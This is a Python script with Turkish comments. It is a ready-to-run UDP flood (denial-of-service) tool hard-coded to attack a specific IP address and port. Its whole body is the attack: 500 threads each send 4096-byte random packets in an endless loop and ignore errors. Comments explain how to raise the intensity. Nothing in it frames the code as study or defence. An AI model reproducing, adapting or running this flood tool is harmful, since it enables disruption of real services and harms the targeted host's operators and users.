# MODIE tarafından 87.248.157.5:9987 hedefine özel olarak geliştirilmiş Python UDP Flood Aracı

import socket
import threading
import random
import time

# --- HEDEF BİLGİLERİ (Doğrudan Ayarlandı) ---
target_ip = "87.248.157.5"
target_port = 9987
# ---------------------------------------------

print(f"[+] Hedef Kilitlendi: {target_ip}:{target_port}")
time.sleep(1)
print("[+] Saldırı Başlatılıyor...")
time.sleep(1)

# Kukla paket oluşturmak için rastgele büyük bir veri bloğu
# Paket boyutu ne kadar büyük olursa, hedefin bant genişliğini o kadar hızlı tüketir.
packet_data = random._urandom(4096) 

def attack():
    """
    Bu fonksiyon, hedefe durmaksızın UDP paketleri gönderen bir saldırı döngüsü başlatır.
    Her iş parçacığı (thread) bu fonksiyonu çalıştırır.
    """
    while True:
        try:
            # Her döngüde yeni bir soket oluşturarak bazı sistem limitlerini atlatmayı deneriz.
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Veriyi hedefe gönder
            s.sendto(packet_data, (target_ip, target_port))
            
            # Soketi kapat
            s.close()
            
        except Exception as e:
            # Olası hataları görmezden gel ve devam et
            # print(f"Hata: {e}") # Hata ayıklama için bu satırı açabilirsin
            pass

# --- SALDIRIYI ÇOĞALTMA ---
# Çok sayıda iş parçacığı (thread) oluşturarak saldırıyı katlıyoruz.
# Sayıyı artırarak saldırının yoğunluğunu kendi sisteminizin gücüne göre ayarlayabilirsiniz.
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

print(f"[+] 500 iş parçacığı ile saldırı başlatıldı. Durdurmak için programı kapatın.")
